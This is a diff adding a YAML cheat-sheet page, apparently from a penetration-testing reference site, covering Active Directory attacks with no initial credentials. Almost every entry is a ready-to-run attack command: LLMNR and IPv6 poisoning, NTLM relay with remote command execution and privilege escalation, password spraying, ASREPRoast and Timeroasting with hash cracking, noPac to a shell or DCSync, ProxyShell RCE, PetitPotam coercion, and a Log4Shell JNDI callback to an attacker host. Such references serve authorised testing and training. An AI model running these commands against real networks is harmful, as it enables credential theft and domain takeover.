@@ -1,0 +1,197 @@
+tab: nocreds
+title: No credentials
+order: 10
+blurb: >
+  Foothold with nothing but network access to the domain. $RHOST = DC.
+  Goal: a set of valid usernames, then a first credential (spray, roast, poison, or a known unauth CVE).
+
+sections:
+
+  - name: Find the DC / domain
+    hint: Confirm the DC, domain name and naming contexts before anything else.
+    steps:
+      - text: Identify DC + domain from SMB / LDAP
+        cmds:
+          - "nxc smb $RHOST"
+          - {c: "crackmapexec smb $RHOST", lbl: "CME (deprecated) — nxc equivalent above"}
+          - "ldapsearch -x -H ldap://$RHOST -s base namingcontexts"
+          - "ldapsearch -x -H ldap://$RHOST -s base -b '' '(objectClass=*)'"
+      - text: DNS — find records / zone (needs a hint of the domain)
+        cmds:
+          - "nslookup -type=SRV _ldap._tcp.dc._msdcs.$DOMAIN $RHOST"
+          - "dig @$RHOST $DOMAIN any"
+
+  - name: Anonymous / Guest enumeration
+    hint: Null and guest sessions before you have any creds.
+    steps:
+      - text: Null-session SMB — shares, users, pass policy
+        flags: [nocreds]
+        cmds:
+          - "nxc smb $RHOST -u '' -p '' --shares"
+          - "nxc smb $RHOST -u 'guest' -p '' --shares"
+          - "smbmap -H $RHOST -u '' -p ''"
+          - {c: "smbclient -N -L //$RHOST/", lbl: "list shares, no auth"}
+      - text: RPC null session
+        cmds:
+          - "rpcclient -U '' -N $RHOST"
+          - "rpcclient -U '' -N $RHOST -c 'enumdomusers'"
+          - "rpcclient -U '' -N $RHOST -c 'querydominfo'"
+      - text: enum4linux-ng (wraps the above)
+        cmds:
+          - "enum4linux-ng -A $RHOST"
+          - {c: "enum4linux -a $RHOST", lbl: "legacy"}
+      - text: Anonymous LDAP dump
+        cmds:
+          - {c: "windapsearch.py -d $DOMAIN --dc-ip $RHOST -U", lbl: "ropnop windapsearch — users, anon"}
+          - "ldapsearch -x -H ldap://$RHOST -b 'DC=<corp>,DC=<local>' '(objectClass=user)' sAMAccountName"
+
+  - name: RID cycling & user harvesting
+    hint: Turn a null/guest session or one weak cred into a username list.
+    steps:
+      - text: RID brute to enumerate accounts
+        cmds:
+          - "nxc smb $RHOST -u 'guest' -p '' --rid-brute"
+          - "lookupsid.py $DOMAIN/$USER:$PASS@$RHOST"
+          - {c: "lookupsid.py '$DOMAIN/:'@$RHOST", lbl: "anonymous SID lookup"}
+      - text: Kerberos user enumeration (no creds, needs a userlist)
+        flags: [nocreds]
+        cmds:
+          - "kerbrute userenum -d $DOMAIN --dc $RHOST $USERLIST"
+          - "nxc smb $RHOST -u $USERLIST -p '' -k"
+
+  - name: Poisoning (LLMNR / NBT-NS / mDNS)
+    hint: Sit on the wire and catch NetNTLM hashes from broken name resolution.
+    steps:
+      - text: Responder — capture NetNTLMv1/v2
+        flags: [opsec]
+        cmds:
+          - "responder -I <iface> -wv"
+          - {c: "responder -I <iface> -wvF", lbl: "force WPAD auth"}
+          - "# hashes land in /usr/share/responder/logs/"
+      - text: Inveigh (PowerShell) — Windows attacker host
+        flags: [win]
+        cmds:
+          - {c: "Import-Module .\\Inveigh.ps1; Invoke-Inveigh -NBNS Y -ConsoleOutput Y", lbl: "classic Inveigh"}
+      - text: InveighZero / C# Inveigh — Windows attacker host
+        flags: [win]
+        cmds:
+          - {c: ".\\Inveigh.exe -LLMNR Y -NBNS Y", lbl: "LLMNR on by default; NBNS opt-in"}
+          - {c: "dotnet Inveigh.dll", lbl: ".NET build"}
+      - text: Crack captured NetNTLM
+        cmds:
+          - "hashcat -m 5600 netntlmv2.hash $PASSLIST"
+          - {c: "hashcat -m 5500 netntlmv1.hash $PASSLIST", lbl: "NetNTLMv1"}
+
+  - name: NTLM relay (no cracking needed)
+    hint: Relay caught auth to a host where SMB signing is off. Turn Responder's HTTP/SMB off first.
+    steps:
+      - text: Find relay targets (signing not required)
+        cmds:
+          - "nxc smb <cidr> --gen-relay-list relay_targets.txt"
+      - text: Relay with ntlmrelayx
+        flags: [opsec]
+        cmds:
+          - "ntlmrelayx.py -tf relay_targets.txt -smb2support"
+          - {c: "ntlmrelayx.py -t smb://$TARGET -smb2support -c 'whoami'", lbl: "exec on relay"}
+          - {c: "ntlmrelayx.py -t ldap://$RHOST --escalate-user $USER", lbl: "self-escalate via LDAP"}
+          - {c: "ntlmrelayx.py -t ldaps://$RHOST --delegate-access", lbl: "grant RBCD to a computer you control"}
+          - {c: "ntlmrelayx.py -t smb://$TARGET -smb2support -socks", lbl: "hold sessions in SOCKS"}
+
+  - name: IPv6 takeover (mitm6)
+    hint: Most networks run IPv6 unconfigured — spoof DHCPv6/DNS to become the victim's resolver, then relay.
+    steps:
+      - text: Poison IPv6 DNS
+        flags: [opsec]
+        cmds:
+          - "mitm6 -d $DOMAIN"
+      - text: Relay the captured auth (WPAD + delegate/escalate)
+        flags: [opsec]
+        cmds:
+          - "ntlmrelayx.py -6 -t ldaps://$RHOST -wh fakewpad.$DOMAIN --delegate-access"
+          - {c: "ntlmrelayx.py -6 -t ldaps://$RHOST -wh fakewpad.$DOMAIN --escalate-user $USER", lbl: "escalate a user you own"}
+
+  - name: Password spray & bruteforce
+    hint: One password against many users. Watch lockout policy first (--pass-pol via guest/null).
+    steps:
+      - text: Spray with kerbrute / nxc
+        flags: [opsec]
+        cmds:
+          - "kerbrute passwordspray -d $DOMAIN --dc $RHOST $USERLIST '$PASS'"
+          - "nxc smb $RHOST -u $USERLIST -p '$PASS' --continue-on-success --no-bruteforce"
+      - text: DomainPasswordSpray (from a domain-joined Windows box)
+        flags: [win]
+        cmds:
+          - {c: "Invoke-DomainPasswordSpray -Password '$PASS'", lbl: "auto-pulls userlist from AD"}
+          - "Invoke-DomainPasswordSpray -UserList users.txt -Password '$PASS' -OutFile sprayed.txt"
+
+  - name: ASREPRoast (no preauth)
+    hint: Users with 'Do not require Kerberos preauth' — roastable with only a username list.
+    steps:
+      - text: Request AS-REP hashes
+        flags: [nocreds]
+        cmds:
+          - "impacket-GetNPUsers $DOMAIN/ -usersfile $USERLIST -dc-ip $RHOST -no-pass -format hashcat"
+          - "nxc ldap $RHOST -u $USERLIST -p '' --asreproast asrep.out"
+      - text: Crack
+        cmds:
+          - "hashcat -m 18200 asrep.hash $PASSLIST"
+
+  - name: Known unauthenticated CVEs
+    hint: Check before you spray — some give instant DA.
+    steps:
+      - text: ZeroLogon (CVE-2020-1472) — safe check
+        flags: [cve]
+        cmds:
+          - {c: "nxc smb $RHOST -M zerologon", lbl: "detect only"}
+          - {c: "zerologon_tester.py <dc_host> $RHOST", lbl: "standalone checker"}
+          - "# exploit resets the DC machine account password — lab only"
+      - text: noPac (CVE-2021-42278/42287) — needs any valid user
+        flags: [cve]
+        cmds:
+          - {c: "nxc smb $RHOST -u $USER -p $PASS -M nopac", lbl: "scan"}
+          - "noPac.py $DOMAIN/$USER:$PASS -dc-ip $RHOST -dc-host <dc_host> --impersonate administrator -use-ldap -shell"
+          - {c: "noPac.py $DOMAIN/$USER:$PASS -dc-ip $RHOST -dc-host <dc_host> --impersonate administrator -use-ldap -dump", lbl: "DCSync instead of shell"}
+      - text: EternalBlue (MS17-010)
+        flags: [cve]
+        cmds:
+          - "nxc smb $RHOST -u '' -p '' -M ms17-010"
+          - "nmap -p445 --script smb-vuln-ms17-010 $RHOST"
+      - text: PetitPotam (unauth coerce, CVE-2021-36942)
+        flags: [cve]
+        cmds:
+          - "petitpotam.py -u '' -p '' $LHOST $RHOST"
+          - "# pair with ntlmrelayx -t http://<ca>/certsrv/certfnsh.asp for AD CS relay"
+
+  - name: Timeroasting
+    hint: Unauthenticated — abuse MS-SNTP to get crackable hashes for computer accounts (UDP 123).
+    steps:
+      - text: Harvest SNTP-MS hashes
+        flags: [nocreds]
+        cmds:
+          - "timeroast.py $RHOST -o timeroast.out"
+      - text: Crack (computer account passwords)
+        cmds:
+          - "hashcat -m 31300 timeroast.out $PASSLIST"
+
+  - name: Exchange
+    hint: On-prem Exchange front-ends are frequent unauth entry points.
+    steps:
+      - text: ProxyShell (CVE-2021-34473/34523/31207)
+        flags: [cve]
+        cmds:
+          - "proxyshell_rce.py -u https://$RHOST -e administrator@$DOMAIN"
+      - text: ProxyNotShell / others (need a mailbox cred)
+        cmds:
+          - "# ProxyNotShell (CVE-2022-41040 + 41082) requires a valid mailbox — see Valid user"
+
+  - name: More unauthenticated CVEs
+    hint: Version-driven — confirm the target build first.
+    steps:
+      - text: SMBGhost (CVE-2020-0796) — SMBv3 compression
+        flags: [cve]
+        cmds:
+          - "nmap -p445 --script smb-vuln-cve-2020-0796 $RHOST"
+      - text: Log4Shell (weak web app on a domain host)
+        flags: [cve]
+        cmds:
+          - "# inject: ${jndi:ldap://$LHOST:$LPORT/x}  -> catch with a rogue LDAP/HTTP server"
